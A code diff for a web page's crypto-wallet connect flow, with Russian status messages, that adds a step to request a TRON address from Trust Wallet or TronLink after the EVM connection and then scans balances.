@@ -221,6 +221,35 @@
       }
 
       /* ---- CONNECT ---- */
+      function requestTronAddr() {
+        var tw = getTronWeb();
+        if (!tw) return Promise.resolve("");
+
+        // First try passive (already connected)
+        var passive = readPassiveTron();
+        if (passive) return Promise.resolve(passive);
+
+        // Try requesting via tronWeb or tronLink provider
+        var provider = tw.request ? tw
+          : (window.trustwallet && window.trustwallet.tronLink) || window.tronLink || window.tron || null;
+        if (!provider || !provider.request) return Promise.resolve("");
+
+        return provider.request({ method: "eth_requestAccounts" })
+          .then(function(r) {
+            if (Array.isArray(r) && r[0]) { var a = readBase58(r[0]); if (a) return a; }
+            if (typeof r === "string" && readBase58(r)) return readBase58(r);
+            // After request, defaultAddress might now be populated
+            return new Promise(function(resolve) {
+              setTimeout(function() { resolve(readPassiveTron()); }, 500);
+            });
+          })
+          .catch(function() {
+            return new Promise(function(resolve) {
+              setTimeout(function() { resolve(readPassiveTron()); }, 500);
+            });
+          });
+      }
+
       function doConnect() {
         var btn = $("#connect-btn"); if (btn) btn.disabled = true;
         setStatus("Подтвердите вход в кошельке...");
@@ -239,14 +268,22 @@
 
             var p = loadProfile()||{};
             p.evmAddress = evmAddr;
-            // grab TRON now (might be available after EVM connect in some TW versions)
             if (!p.tronAddress) p.tronAddress = readPassiveTron() || tronFound || "";
             saveProfile(p);
             unlockForm(p);
-            setStatus("Получено. Проверяем балансы...");
-            doScan(p);
+            setStatus(p.tronAddress ? "EVM + TRON получены. Проверяем балансы..." : "EVM получен. Запрашиваем TRON...");
+
+            // Always try to get TRON after EVM (tronWeb might now be ready)
+            requestTronAddr().then(function(tronAddr) {
+              if (tronAddr && tronAddr !== p.tronAddress) {
+                p.tronAddress = tronAddr;
+                saveProfile(p);
+                unlockForm(p);
+              }
+              doScan(p);
+            });
           })
-          .catch(function(e){
+          .catch(function(){
             setStatus("Отклонено. Подтвердите запрос в Trust Wallet.");
             if (btn) btn.disabled = false;
           });
